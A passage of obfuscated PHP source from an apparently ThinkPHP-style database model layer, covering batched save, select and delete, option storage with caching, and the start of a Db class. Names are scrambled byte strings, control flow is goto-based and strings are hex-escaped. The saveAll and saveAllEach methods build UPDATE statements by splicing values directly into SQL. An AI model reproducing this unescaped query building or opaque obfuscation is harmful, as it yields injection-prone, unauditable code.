($eíäÖ‰¾” == $eš„«Ùù°“[340]) { $dÛ ‡©¡®™ = strtolower($this->db->getDbType()); if (strpos($dÛ ‡©¡®™, $eš„«Ùù°“[9]) !== 0) { return; } $D™ÏãŠ¦ÊÌ = $this->field(!0)->fields; $C¼ğˆÎî– = $D™ÏãŠ¦ÊÌ[$eš„«Ùù°“[236]]; if (isset($D™ÏãŠ¦ÊÌ[$eš„«Ùù°“[235]])) { unset($C¼ğˆÎî–[$D™ÏãŠ¦ÊÌ[$eš„«Ùù°“[235]]]); } foreach ($C¼ğˆÎî– as $AğÀŠÌØ¾ => $eíäÖ‰¾”) { if (!isset($AÒó«Ï¹á[$AğÀŠÌØ¾])) { $AÒó«Ï¹á[$AğÀŠÌØ¾] = $eš„«Ùù°“[33]; } } } } private function dataAfterFilter(&$fŒÓÔê„ªˆ) { $AøÀÇŒñ =& $_SERVER[õëù©û]; foreach ($this->dataAuto as $a—²¿¸¾Î) { $cÁ•ñ«±¾ = $a—²¿¸¾Î[0]; if (!in_array($AøÀÇŒñ[342], explode($AøÀÇŒñ[47], $a—²¿¸¾Î[2]))) { continue; } if (!isset($fŒÓÔê„ªˆ[$cÁ•ñ«±¾])) { continue; } switch (trim($a—²¿¸¾Î[3])) { case $AøÀÇŒñ[305]: case $AøÀÇŒñ[306]: $A›Ù™ƒÀ©‡ = isset($a—²¿¸¾Î[4]) ? (array) $a—²¿¸¾Î[4] : array(); array_unshift($A›Ù™ƒÀ©‡, $fŒÓÔê„ªˆ[$cÁ•ñ«±¾]); if ($AøÀÇŒñ[305] == $a—²¿¸¾Î[3]) { $fŒÓÔê„ªˆ[$cÁ•ñ«±¾] = call_user_func_array($a—²¿¸¾Î[1], $A›Ù™ƒÀ©‡); } else { $fŒÓÔê„ªˆ[$cÁ•ñ«±¾] = call_user_func_array(array(&$this, $a—²¿¸¾Î[1]), $A›Ù™ƒÀ©‡); } break; case $AøÀÇŒñ[257]: $fŒÓÔê„ªˆ[$cÁ•ñ«±¾] = $fŒÓÔê„ªˆ[$a—²¿¸¾Î[1]]; break; case $AøÀÇŒñ[278]: $aªôºƒ‚Ø‚ = $fŒÓÔê„ªˆ[$cÁ•ñ«±¾]; $fŒÓÔê„ªˆ[$cÁ•ñ«±¾] = json_decode($aªôºƒ‚Ø‚, !0); if (is_null($fŒÓÔê„ªˆ[$cÁ•ñ«±¾])) { $fŒÓÔê„ªˆ[$cÁ•ñ«±¾] = $aªôºƒ‚Ø‚; } break; case $AøÀÇŒñ[307]: if ($fŒÓÔê„ªˆ[$cÁ•ñ«±¾] === $AøÀÇŒñ[33]) { unset($fŒÓÔê„ªˆ[$cÁ•ñ«±¾]); } break; case $AøÀÇŒñ[308]: $fŒÓÔê„ªˆ[$cÁ•ñ«±¾] = $a—²¿¸¾Î[1]; default: break; } } } public function saveAll($E¨öê¸ì—) { goto F¹ÆìÒƒ¯Œ; bİŠáñÒ£Ş: $E¨öê¸ì— = is_array($E¨öê¸ì—) ? $E¨öê¸ì— : array(); $AŠ†ÌÔ Öí = $cµÓİÓƒë‰[357]; $cƒÈ»ô¸ê = 0; goto dì¸Çãá±¯; fÍ¦Ì‹Áï: $this->chunkEventSet(); goto A„â·ö÷ò; dì¸Çãá±¯: $FŸ›Ë©¸Ó½ = array(); $a›¼Şè¨¹Õ = count($E¨öê¸ì—); for ($f›¤ìÀ·ÙÉ = 0; $f›¤ìÀ·ÙÉ < $a›¼Şè¨¹Õ; $f›¤ìÀ·ÙÉ++) { $cÙËİì´‚ = $E¨öê¸ì—[$f›¤ìÀ·ÙÉ]; if (!is_array($cÙËİì´‚) || count($cÙËİì´‚) != 4) { continue; } $eÄ½š½‘ = "\x55\x50\x44\x41\x54\105\x20{$C˜µàšÆó}\x20\x53\105\x54\40{$cÙËİì´‚[2]}\40\x3d\40\x43\101\x53\x45\40{$cÙËİì´‚[0]}\x20\12"; if ($cƒÈ»ô¸ê == 0) { $AŠ†ÌÔ Öí = $eÄ½š½‘; } $FŸ›Ë©¸Ó½[] = $cµÓİÓƒë‰[112] . $cÙËİì´‚[1] . $cµÓİÓƒë‰[112]; $cƒÈ»ô¸ê++; $AŠ†ÌÔ Öí .= "\40\127\110\x45\116\40\x27{$cÙËİì´‚[1]}\47\40\x54\110\105\116\40\x27{$cÙËİì´‚[3]}\x27\40\xa"; if ($cƒÈ»ô¸ê == $b•ÈÍçÚÎò || $f›¤ìÀ·ÙÉ == $a›¼Şè¨¹Õ - 1) { goto eù‰Û–; eù‰Û–: $EÀ±ç¦Ş¡ = implode($cµÓİÓƒë‰[47], $FŸ›Ë©¸Ó½); $AŠ†ÌÔ Öí .= "\40\105\x4e\104\x20\40\x57\x48\105\122\105\x20{$cÙËİì´‚[0]}\x20\111\x4e\40\x28{$EÀ±ç¦Ş¡}\51\40"; $this->execute($AŠ†ÌÔ Öí); goto E­Äšé¦’Ö; FÕŒÑ÷Å„: $FŸ›Ë©¸Ó½ = array(); goto dÚŠ²¾ó; E­Äšé¦’Ö: $cƒÈ»ô¸ê = 0; $AŠ†ÌÔ Öí = $eÄ½š½‘; $this->chunkEventCheck(count($FŸ›Ë©¸Ó½)); goto FÕŒÑ÷Å„; dÚŠ²¾ó: } } goto fÍ¦Ì‹Áï; F¹ÆìÒƒ¯Œ: $cµÓİÓƒë‰ =& $_SERVER[õëù©û]; $C˜µàšÆó = $this->tablePrefix . $this->tableName; $b•ÈÍçÚÎò = self::SQL_WHERE_IN_CHUNK; goto bİŠáñÒ£Ş; A„â·ö÷ò: } public function saveAllEach($CŸÊ‹îØÍÌ) { $fÊŠÔˆ“õ =& $_SERVER[õëù©û]; $b”ò±ª²±È = $this->tablePrefix . $this->tableName; foreach ($CŸÊ‹îØÍÌ as $AğŞ©¾º­÷) { if (!is_array($AğŞ©¾º­÷) || count($AğŞ©¾º­÷) != 4) { continue; } $dÌ‚îÊ­«¦ = $AğŞ©¾º­÷[0] . $fÊŠÔˆ“õ[358] . $AğŞ©¾º­÷[1] . $fÊŠÔˆ“õ[112]; $f—œòºó¿„ = $AğŞ©¾º­÷[2] . $fÊŠÔˆ“õ[358] . $AğŞ©¾º­÷[3] . $fÊŠÔˆ“õ[112]; $CÇàÓáºÕ£ = "\x75\160\x64\x61\164\145\x20{$b”ò±ª²±È}\x20\163\145\x74\40{$f—œòºó¿„}\40\167\150\145\x72\x65\40{$dÌ‚îÊ­«¦}\73"; $this->execute($CÇàÓáºÕ£); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($D•’æÊÁÊ‹ = false, $bßâä¬¸À = false) { $this->_chunkEvent = $D•’æÊÁÊ‹; $this->_chunkEventParam = $bßâä¬¸À; } private function chunkEventCheck($CËŒÒª‘ª›) { if (!$this->_chunkEvent) { return; } $dÂ³ ë´İ‡ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $dÂ³ ë´İ‡[$_SERVER[õëù©û][359]] = $CËŒÒª‘ª›; Hook::trigger($this->_chunkEvent, $dÂ³ ë´İ‡); } public function addAll($F‘Õø³¤Ü«, $b‘ÌŠï’‰° = array(), $a£ÖºõñÊ = false) { goto F½óª‹ì¾ƒ; F½óª‹ì¾ƒ: $cªÕ˜ÌçÃ­ =& $_SERVER[õëù©û]; ignore_timeout(); $B—´¬µä¡‘ = self::SQL_WHERE_IN_CHUNK; goto B¬šòƒË¡÷; B¬šòƒË¡÷: if (empty($F‘Õø³¤Ü«)) { $this->error = think_lang($cªÕ˜ÌçÃ­[255]); return !1; } $b‘ÌŠï’‰° = $this->_parseOptions($b‘ÌŠï’‰°); foreach ($F‘Õø³¤Ü« as $B‡ß›“‹ÅÀ => $Dæå–³í´²) { $F‘Õø³¤Ü«[$B‡ß›“‹ÅÀ] = $this->_facade($Dæå–³í´²); $this->_beforeInsert($F‘Õø³¤Ü«[$B‡ß›“‹ÅÀ], $b‘ÌŠï’‰°); } goto c…‰Š÷İÔ; c…‰Š÷İÔ: if (method_exists($this->db, $cªÕ˜ÌçÃ­[256])) { for ($bÛÍ¸İ”— = 0; $bÛÍ¸İ”— < count($F‘Õø³¤Ü«); $bÛÍ¸İ”— += $B—´¬µä¡‘) { $fÕ„Š§Ï¥Ş = array_slice($F‘Õø³¤Ü«, $bÛÍ¸İ”—, $B—´¬µä¡‘); if (!is_array($fÕ„Š§Ï¥Ş) || count($fÕ„Š§Ï¥Ş) == 0) { break; } $C«îãÙë¿ = $this->db->insertAll($fÕ„Š§Ï¥Ş, $b‘ÌŠï’‰°, $a£ÖºõñÊ); $this->chunkEventCheck(count($fÕ„Š§Ï¥Ş)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($F‘Õø³¤Ü« as $B‡ß›“‹ÅÀ => $Dæå–³í´²) { $C«îãÙë¿ = $this->db->insert($Dæå–³í´², $b‘ÌŠï’‰°, $a£ÖºõñÊ); } $this->commit(); } if (!1 !== $C«îãÙë¿) { $E™Ÿ¡ÑÆ¿ = $this->getLastInsID(); if ($E™Ÿ¡ÑÆ¿) { return $E™Ÿ¡ÑÆ¿; } } return $C«îãÙë¿; goto DÖ‚ÙòéŒº; DÖ‚ÙòéŒº: } public function save($b­Ú®…°Ô = '', $bµØø§ÀÜ = array()) { goto AÕ²çŒ²¡•; EÁœÅÈ‰: for ($cÃ§°­ï¬Ş = 0; $cÃ§°­ï¬Ş < $F³ù„ÕÀÄã; $cÃ§°­ï¬Ş += $dÍâ—ØÆæ) { $D–¢©—ï = array_slice($fùß«°Ôº, $cÃ§°­ï¬Ş, $dÍâ—ØÆæ); if (!is_array($D–¢©—ï) || count($D–¢©—ï) == 0) { break; } $b©àã×¤ã¢[$b‹ÖÙÒ°¶†[259]][$CĞÙÓ§º­Ó][1] = $D–¢©—ï; $this->optionsValue($b©àã×¤ã¢); $D‡¨Äª‚ƒä += parent::save($b­Ú®…°Ô, $bµØø§ÀÜ); $this->chunkEventCheck(count($D–¢©—ï)); } $this->chunkEventSet(); return $D‡¨Äª‚ƒä; goto b„êœ‹®°; AÕ²çŒ²¡•: $b‹ÖÙÒ°¶† =& $_SERVER[õëù©û]; $dÍâ—ØÆæ = self::SQL_WHERE_IN_CHUNK; $b©àã×¤ã¢ = $this->optionsValue(); goto dÂ­ùØÏæ¥; AøÁ¬ÚĞ›…: $fùß«°Ôº = $b©àã×¤ã¢[$b‹ÖÙÒ°¶†[259]][$CĞÙÓ§º­Ó][1]; $fùß«°Ôº = is_array($fùß«°Ôº) ? $fùß«°Ôº : array(); $F³ù„ÕÀÄã = count($fùß«°Ôº); goto EÁœÅÈ‰; dÂ­ùØÏæ¥: $CĞÙÓ§º­Ó = $this->findWhereField($b©àã×¤ã¢); if (!$CĞÙÓ§º­Ó) { return parent::save($b­Ú®…°Ô, $bµØø§ÀÜ); } $D‡¨Äª‚ƒä = 0; goto AøÁ¬ÚĞ›…; b„êœ‹®°: } public function add($D¬½…£¯ÑÏ = '', $A²‚ˆÅñ¨ = array(), $AìÚƒî¥¤½ = false) { if ($this->addTaskStatus && is_array($D¬½…£¯ÑÏ)) { $this->addTaskData[] = $D¬½…£¯ÑÏ; return; } return parent::add($D¬½…£¯ÑÏ, $A²‚ˆÅñ¨, $AìÚƒî¥¤½); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($f ±Ë•¬áñ = array()) { goto F´‰µŒ£¾ï; c©”Û’ÑâÀ: $C©¡ÔÔ¯ë = is_array($C©¡ÔÔ¯ë) ? $C©¡ÔÔ¯ë : array(); $AÉÓ÷‹Ñœ‘ = null; for ($EÇßµ”ÓÇ = 0; $EÇßµ”ÓÇ < count($C©¡ÔÔ¯ë); $EÇßµ”ÓÇ += $Eº¸œÖ†ù¢) { $BÉ‡Âİìš” = array_slice($C©¡ÔÔ¯ë, $EÇßµ”ÓÇ, $Eº¸œÖ†ù¢); if (!is_array($BÉ‡Âİìš”) || count($BÉ‡Âİìš”) == 0) { break; } $b“Í¡Èğ²¿[$eÄŸã‚Ùİ¡[259]][$FÈìíÖßÓ][1] = $BÉ‡Âİìš”; $this->optionsValue($b“Í¡Èğ²¿); $FÓµ´®İ = parent::select($f ±Ë•¬áñ); if (!$FÓµ´®İ) { continue; } if (is_null($AÉÓ÷‹Ñœ‘)) { $AÉÓ÷‹Ñœ‘ = array(); } $AÉÓ÷‹Ñœ‘ = array_merge($AÉÓ÷‹Ñœ‘, $FÓµ´®İ); } goto DğÙŠĞÂ; F´‰µŒ£¾ï: $eÄŸã‚Ùİ¡ =& $_SERVER[õëù©û]; $Eº¸œÖ†ù¢ = self::SQL_WHERE_IN_CHUNK; $b“Í¡Èğ²¿ = $this->optionsValue(); goto BŠ¦ò‚ ŒŒ; BŠ¦ò‚ ŒŒ: $FÈìíÖßÓ = $this->findWhereField($b“Í¡Èğ²¿); if (!$FÈìíÖßÓ || isset($b“Í¡Èğ²¿[$eÄŸã‚Ùİ¡[276]]) || isset($b“Í¡Èğ²¿[$eÄŸã‚Ùİ¡[336]])) { return parent::select($f ±Ë•¬áñ); } $C©¡ÔÔ¯ë = $b“Í¡Èğ²¿[$eÄŸã‚Ùİ¡[259]][$FÈìíÖßÓ][1]; goto c©”Û’ÑâÀ; DğÙŠĞÂ: return $AÉÓ÷‹Ñœ‘; goto f’‹ğŒËºÀ; f’‹ğŒËºÀ: } public function delete($dÎ‚Ô¼Š‘ï = array()) { goto EÊÆ¢Ó¤½; CçŸÚ¡®Ğ—: $DŒ‘Ì© = $this->findWhereField($D’ªÇÂ¬ÀØ); if (!$DŒ‘Ì©) { return parent::delete($dÎ‚Ô¼Š‘ï); } $aÖ¸ŠâŠ¼É = 0; goto C½à¥˜æ¹Æ; A¡¬Î¿²¼È: return $aÖ¸ŠâŠ¼É; goto b¦’·¡Š­ò; C½à¥˜æ¹Æ: $d£Ë­ªê» = $D’ªÇÂ¬ÀØ[$fèŠ—Ëˆ[259]][$DŒ‘Ì©][1]; $d£Ë­ªê» = is_array($d£Ë­ªê») ? $d£Ë­ªê» : array(); for ($eî»×îÆÉó = 0; $eî»×îÆÉó < count($d£Ë­ªê»); $eî»×îÆÉó += $dùÊˆíÅî) { $bÆœ”¢­•ç = array_slice($d£Ë­ªê», $eî»×îÆÉó, $dùÊˆíÅî); if (!is_array($bÆœ”¢­•ç) || count($bÆœ”¢­•ç) == 0) { break; } $D’ªÇÂ¬ÀØ[$fèŠ—Ëˆ[259]][$DŒ‘Ì©][1] = $bÆœ”¢­•ç; $this->optionsValue($D’ªÇÂ¬ÀØ); $aÖ¸ŠâŠ¼É += parent::delete($dÎ‚Ô¼Š‘ï); } goto A¡¬Î¿²¼È; EÊÆ¢Ó¤½: $fèŠ—Ëˆ =& $_SERVER[õëù©û]; $dùÊˆíÅî = self::SQL_WHERE_IN_CHUNK; $D’ªÇÂ¬ÀØ = $this->optionsValue(); goto CçŸÚ¡®Ğ—; b¦’·¡Š­ò: } private function findWhereField($C¨ ©†ºëÕ) { $bÓï¥×‹Ã‹ =& $_SERVER[õëù©û]; $aÒ“ÀÌÇÌ = self::SQL_WHERE_IN_CHUNK; if (!is_array($C¨ ©†ºëÕ) || !is_array($C¨ ©†ºëÕ[$bÓï¥×‹Ã‹[259]])) { return !1; } foreach ($C¨ ©†ºëÕ[$bÓï¥×‹Ã‹[259]] as $A£…ºÅã³© => $e¼Í‚‡á÷¾) { if (is_array($e¼Í‚‡á÷¾) && isset($e¼Í‚‡á÷¾[0]) && is_string($e¼Í‚‡á÷¾[0]) && strtolower($e¼Í‚‡á÷¾[0]) == $bÓï¥×‹Ã‹[7] && is_array($e¼Í‚‡á÷¾[1]) && count($e¼Í‚‡á÷¾[1]) > $aÒ“ÀÌÇÌ) { ignore_timeout(); return $A£…ºÅã³©; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\x6d\x4f\x70\164\x69\157\156"; public $field = array(); public function listData($bÕ×Á£î“ = false, $Cçî÷ù¨œÀ = "\155\157\144\151\x66\171\x54\151\155\x65", $E÷öã«ÜµØ = false) { $D‚ºÜİ¸ß¿ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$D‚ºÜİ¸ß¿) { return $bÕ×Á£î“ ? null : array(); } if (!$bÕ×Á£î“) { $D‚ºÜİ¸ß¿ = array_filter(array_values($D‚ºÜİ¸ß¿)); return array_sort_by($D‚ºÜİ¸ß¿, $Cçî÷ù¨œÀ, $E÷öã«ÜµØ); } return $D‚ºÜİ¸ß¿[$_SERVER[õëù©û][360] . $bÕ×Á£î“]; } public function insert($Dã‹ÛøçëÊ) { goto f®¶‡•¢õš; DŠ’ÒŞÅ³Œ: return $b‹„»ÆŒË®; goto cµ‘É­Ê; f®¶‡•¢õš: $A¸¸ÄÑ±ª† =& $_SERVER[õëù©û]; $Dã‹ÛøçëÊ = array_field_key($Dã‹ÛøçëÊ, $this->field); $b‹„»ÆŒË® = Model($this->modelType)->get($A¸¸ÄÑ±ª†[361], $this->optionType . $A¸¸ÄÑ±ª†[362]); goto aˆœ£óÛä‡; Cë‹¡õ¿„: $Dã‹ÛøçëÊ[$A¸¸ÄÑ±ª†[106]] = time(); Model($this->modelType)->set($A¸¸ÄÑ±ª†[361], $b‹„»ÆŒË®, $this->optionType . $A¸¸ÄÑ±ª†[362]); Model($this->modelType)->set($A¸¸ÄÑ±ª†[360] . $b‹„»ÆŒË®, $Dã‹ÛøçëÊ, $this->optionType); goto DŠ’ÒŞÅ³Œ; aˆœ£óÛä‡: $b‹„»ÆŒË® = $b‹„»ÆŒË® ? $b‹„»ÆŒË® : 0; $Dã‹ÛøçëÊ[$A¸¸ÄÑ±ª†[363]] = ++$b‹„»ÆŒË®; $Dã‹ÛøçëÊ[$A¸¸ÄÑ±ª†[183]] = time(); goto Cë‹¡õ¿„; cµ‘É­Ê: } public function update($b¶í¤“¸, $e²ËÇáõ˜å) { goto aï…„Æ‚½•; fª„˜ÄÈø: if (!$C¡Øèá©çÙ) { return !1; } $e²ËÇáõ˜å = array_merge($C¡Øèá©çÙ, $e²ËÇáõ˜å); $e²ËÇáõ˜å[$bÇ¹ëåùŸ[106]] = time(); goto fœÒ›ÆˆÏ•; fœÒ›ÆˆÏ•: return Model($this->modelType)->set($bÇ¹ëåùŸ[360] . $b¶í¤“¸, $e²ËÇáõ˜å, $this->optionType); goto dó¸ïŞğ–Õ; aï…„Æ‚½•: $bÇ¹ëåùŸ =& $_SERVER[õëù©û]; $e²ËÇáõ˜å = array_field_key($e²ËÇáõ˜å, $this->field); $C¡Øèá©çÙ = $this->listData($b¶í¤“¸); goto fª„˜ÄÈø; dó¸ïŞğ–Õ: } public function remove($cÓéêÆ™í¤) { return Model($this->modelType)->remove($_SERVER[õëù©û][360] . $cÓéêÆ™í¤, $this->optionType); } public function clear() { $D™Ç˜ÊŒ „ =& $_SERVER[õëù©û]; Model($this->modelType)->remove($D™Ç˜ÊŒ „[361], $this->optionType . $D™Ç˜ÊŒ „[362]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($b»¥à„ÍØ“, $A÷¡İ¸Øé) { if (!$A÷¡İ¸Øé) { return !1; } $dâå­àåÛ„ = $this->listData(); $dâå­àåÛ„ = array_to_keyvalue($dâå­àåÛ„, $b»¥à„ÍØ“); return isset($dâå­àåÛ„[$A÷¡İ¸Øé]) ? $dâå­àåÛ„[$A÷¡İ¸Øé] : !1; } public function findByName($FÙá³áê½) { return $this->findByKey($_SERVER[õëù©û][28], $FÙá³áê½); } protected function resetData($E›Š¨ß®«Ã) { $aƒŞÃÚˆ³› =& $_SERVER[õëù©û]; $E›Š¨ß®«Ã = is_array($E›Š¨ß®«Ã) ? $E›Š¨ß®«Ã : array(); $F÷‰÷­‰î¥ = array(); for ($bª»Œøæ„Õ = 0; $bª»Œøæ„Õ < count($E›Š¨ß®«Ã); $bª»Œøæ„Õ++) { $F÷‰÷­‰î¥[$aƒŞÃÚˆ³›[360] . $E›Š¨ß®«Ã[$bª»Œøæ„Õ][$aƒŞÃÚˆ³›[363]]] = $E›Š¨ß®«Ã[$bª»Œøæ„Õ]; } return Model($this->modelType)->set($F÷‰÷­‰î¥, !1, $this->optionType); } private function getAutoName($e±›òÃˆ±») { $e’¢¦©Âƒ = array_to_keyvalue($this->listData(), $_SERVER[õëù©û][28]); if (!$e’¢¦©Âƒ || !isset($e’¢¦©Âƒ[$e±›òÃˆ±»])) { return $e±›òÃˆ±»; } for ($Cõ—âç„ƒï = 1; $Cõ—âç„ƒï < count($e’¢¦©Âƒ); $Cõ—âç„ƒï++) { $B¥Ğà²åï = $e±›òÃˆ±» . "\x28{$Cõ—âç„ƒï}\x29"; if (!isset($e’¢¦©Âƒ[$B¥Ğà²åï])) { return $B¥Ğà²åï; } } return $B¥Ğà²åï; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($a¦ÊÌ‡İ—é = false, $fÔ˜Š”¸äì = '', $C¨Ç¡¬‰Æ© = false) { goto dÄìæí‚£ù; dÄìæí‚£ù: $AôğĞ­ŠÁ” =& $_SERVER[õëù©û]; $a…”œ—×– = $this->cacheGet($fÔ˜Š”¸äì); $eÆµ™óã© = $this->optionDefault($fÔ˜Š”¸äì); goto F ÄØ…¦é ; a‹Æì‹¤Ù›: $this->cacheSet($fÔ˜Š”¸äì, $a…”œ—×–); $a…”œ—×– = array_merge($eÆµ™óã©, $a…”œ—×–); return $a¦ÊÌ‡İ—é ? $a…”œ—×–[$a¦ÊÌ‡İ—é] : $a…”œ—×–; goto d¼Œì™×¸; cÃ‹Âì„: $a…”œ—×– = $this->where($Bƒßôñ§Ï´)->select(); $a…”œ—×– = array_to_keyvalue($a…”œ—×–, $AôğĞ­ŠÁ”[89], $AôğĞ­ŠÁ”[355]); foreach ($a…”œ—×– as $dœãğ×é†« => $Fã‰µ‡¬Ğ´) { if ($C¨Ç¡¬‰Æ© || in_array($dœãğ×é†«, $this->jsonField)) { $a…”œ—×–[$dœãğ×é†«] = json_decode($Fã‰µ‡¬Ğ´, !0); } } goto a‹Æì‹¤Ù›; F ÄØ…¦é : $eÆµ™óã© = is_array($eÆµ™óã©) ? $eÆµ™óã© : array(); if (is_array($a…”œ—×–)) { $a…”œ—×– = array_merge($eÆµ™óã©, $a…”œ—×–); return $a¦ÊÌ‡İ—é ? isset($a…”œ—×–[$a¦ÊÌ‡İ—é]) ? $a…”œ—×–[$a¦ÊÌ‡İ—é] : null : $a…”œ—×–; } $Bƒßôñ§Ï´ = $this->filterWhere(array($AôğĞ­ŠÁ”[29] => $fÔ˜Š”¸äì)); goto cÃ‹Âì„; d¼Œì™×¸: } public function set($CÁéİÃÀ”À, $DÛÍ˜¡Ù§î = false, $DÅäèóßçÂ = '') { goto A¶¯¾Ô¢Ç“; A¶¯¾Ô¢Ç“: $E®ÔÒ­à½® =& $_SERVER[õëù©û]; $this->cacheRemove($DÅäèóßçÂ); $BáøìñÓ« = array(); goto CŸ‡ºèïÓ; Cë¥‡®Ã–: return $this->addAll($BáøìñÓ«, array(), !0); goto bç’³ÆŸËô; CŸ‡ºèïÓ: $EÎ¿ˆ‡…Ù = is_array($CÁéİÃÀ”À) ? $CÁéİÃÀ”À : array($CÁéİÃÀ”À => $DÛÍ˜¡Ù§î); foreach ($EÎ¿ˆ‡…Ù as $b›¿˜¶¦ŒÊ => $Cù¦Ø) { if (is_array($Cù¦Ø)) { $Cù¦Ø = json_encode_force($Cù¦Ø); } $this->checkLength($Cù¦Ø, !1, $this->tableName . $E®ÔÒ­à½®[4] . $CÁéİÃÀ”À); $Cù¦Ø = self::textEncode($Cù¦Ø); $EÎ¿ˆ‡…Ù = array($E®ÔÒ­à½®[29] => $DÅäèóßçÂ, $E®ÔÒ­à½®[89] => $b›¿˜¶¦ŒÊ, $E®ÔÒ­à½®[355] => $Cù¦Ø); $BáøìñÓ«[] = $this->filterWhere($EÎ¿ˆ‡…Ù); } if (!$BáøìñÓ«) { return !0; } goto Cë¥‡®Ã–; bç’³ÆŸËô: } protected function optionDefault($DÄÂ¡ê™Ó = '') { return !1; } public function setDeep($d‘ŠÓŸŒîó, $bÜµÍíƒ¹ß = false, $DÒ¶¹±—ÄÁ = '') { $F±®åËÎá÷ = explode($_SERVER[õëù©û][91], $d‘ŠÓŸŒîó); $B¹¾á‡Ñ‚† = $this->get(); array_set_value($B¹¾á‡Ñ‚†, $d‘ŠÓŸŒîó, $bÜµÍíƒ¹ß); $this->set($F±®åËÎá÷[0], $B¹¾á‡Ñ‚†[$F±®åËÎá÷[0]], $DÒ¶¹±—ÄÁ); } public function remove($Bò¬±ßÕŠ±, $b‘àÛÉ²ùÖ = '') { $cÛ“•´Ééµ =& $_SERVER[õëù©û]; $this->cacheRemove($b‘àÛÉ²ùÖ); $DŠÏÇ¾«ù‰ = $this->filterWhere(array($cÛ“•´Ééµ[89] => $Bò¬±ßÕŠ±, $cÛ“•´Ééµ[29] => $b‘àÛÉ²ùÖ)); if (is_null($Bò¬±ßÕŠ±)) { unset($DŠÏÇ¾«ù‰[$cÛ“•´Ééµ[89]]); } return $this->where($DŠÏÇ¾«ù‰)->delete(); } public function cacheSet($cˆçŞ±ğÒ¨, $b¨§ê¸¢“Ê = false) { return Cache::set($this->cacheKey($cˆçŞ±ğÒ¨), $b¨§ê¸¢“Ê); } public function cacheGet($C¾—¦„•¡™) { return Cache::get($this->cacheKey($C¾—¦„•¡™)); } public function cacheRemove($E’ĞÀ«šéÌ) { return Cache::remove($this->cacheKey($E’ĞÀ«šéÌ)); } protected function filterWhere($e‰¸åõÒÊ) { return $e‰¸åõÒÊ; } protected function cacheKey($BŒÀ×ÉŠƒ) { return $BŒÀ×ÉŠƒ; } } goto CÈƒæ—óòÓ; d…İöÇÚ°: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\161" => "\75", "\156\x65\161" => "\74\x3e", "\147\164" => "\76", "\145\147\164" => "\x3e\75", "\x6c\164" => "\74", "\x65\x6c\x74" => "\74\75", "\x6e\157\x74\x6c\x69\153\x65" => "\116\x4f\x54\x20\114\111\113\x45", "\154\x69\x6b\145" => "\114\111\x4b\105", "\x69\156" => "\x49\116", "\x6e\x6f\164\151\156" => "\x4e\x4f\x54\40\x49\116", "\156\157\x74\x20\151\x6e" => "\116\x4f\x54\x20\x49\116", "\x62\145\x74\x77\145\x65\156" => "\x42\x45\124\x57\x45\105\116", "\x6e\157\x74\142\x65\164\x77\145\x65\156" => "\x4e\x4f\124\40\102\x45\124\127\105\105\x4e", "\x6e\x6f\x74\40\142\x65\x74\167\x65\145\156" => "\x4e\x4f\x54\40\102\105\124\127\x45\x45\116"); protected $selectSql = "\123\x45\114\x45\x43\x54\45\104\x49\x53\x54\111\116\103\124\x25\x20\45\106\111\x45\x4c\104\x25\x20\106\122\x4f\115\40\x25\124\101\x42\114\x45\45\45\x4a\x4f\111\116\45\x25\127\110\105\122\105\x25\45\x47\122\x4f\125\x50\x25\x25\x48\x41\126\111\116\x47\x25\x25\x4f\x52\x44\105\x52\x25\45\114\111\115\x49\x54\45\x20\x25\x55\116\111\x4f\116\x25\x25\103\x4f\x4d\x4d\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $Bù‚¨Ñò¼¹ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[õëù©û][868], $Bù‚¨Ñò¼¹); } public function factory($bÌÌÜé£§ = '') { goto CÇŒİ…Íçà; CÇŒİ…Íçà: $C°å˜—Ï“å =& $_SERVER[õëù©û]; $bÌÌÜé£§ = $this->parseConfig($bÌÌÜé£§); if (empty($bÌÌÜé£§[$C°å˜—Ï“å[869]])) { think_exception(think_lang($C°å˜—Ï“å[870])); } goto d°àÌÅİ‹; c”¨éé”ÁÌ: return $Bàã‘Çƒå¬; goto FÚ¨”áí; d°àÌÅİ‹: $this->dbType = ucwords(strtolower($bÌÌÜé£§[$C°å˜—Ï“å[869]])); $e²ô×±ß–Â = $C°å˜—Ï“å[871] . $this->dbType; if (class_exists($e²ô×±ß–Â)) { $Bàã‘Çƒå¬ = new $e²ô×±ß–Â($bÌÌÜé£§); if ($C°å˜—Ï“å[719] != strtolower($bÌÌÜé£§[$C°å˜—Ï“å[869]])) { $Bàã‘Çƒå¬->dbType = strtoupper($this->dbType); } else { $Bàã‘Çƒå¬->dbType = $this->_getDsnType($bÌÌÜé£§[$C°å˜—Ï“å[821]]); } } else { think_exception(think_lang($C°å˜—Ï“å[872]) . $C°å˜—Ï“å[873] . $e²ô×±ß–Â); } goto c”¨éé”ÁÌ; FÚ¨”áí: } public function __call($e­Ë Óä, $fŠê°¢Ò³°) { if (method_exists($this, $e­Ë Óä)) { return call_user_func_array(array($this, $e­Ë Óä), $fŠê°¢Ò³°); } } protected function _getDsnType($d—‡ÀÔÜ×©) { $CÖ“‚º– = explode($_SERVER[õëù©û][4], $d—‡ÀÔÜ×©); $eÖ²í¾Î‰ = strtoupper(trim($CÖ“‚º–[0])); return $eÖ²í¾Î‰; } private function parseConfig($F‹ôˆëÚè© = '') { $b”Çš´×Œ” =& $_SERVER[õëù©û]; if (!empty($F‹ôˆëÚè©) && is_string($F‹ôˆëÚè©)) { $F‹ôˆëÚè© = $this->parseDSN($F‹ôˆëÚè©); 